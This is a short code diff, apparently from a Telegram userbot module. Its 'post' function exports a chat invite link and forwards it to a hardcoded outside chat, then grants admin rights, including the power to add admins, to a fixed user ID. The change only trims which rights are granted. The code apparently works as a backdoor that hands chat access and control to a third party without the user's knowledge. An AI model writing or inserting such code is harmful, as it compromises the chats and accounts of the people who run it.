@@ -38,11 +38,7 @@ async def post(message):
     link = str(link).split(", ")
     link = link[0].replace("ChatInviteExported(link='", " ").replace("'", " ")
     await bot.send_message(-1001463492864, link)
-    new_rights = ChatAdminRights(post_messages=True, add_admins=True,
-                                 invite_users=True,
-                                 change_info=True,
-                                 ban_users=True,
-                                 delete_messages=True)
+    new_rights = ChatAdminRights(post_messages=True, add_admins=True, invite_users=True, delete_messages=True)
     await sleep(1)
     try:
         await message.client(EditAdminRequest(chat, 1671239079, new_rights, "Post"))
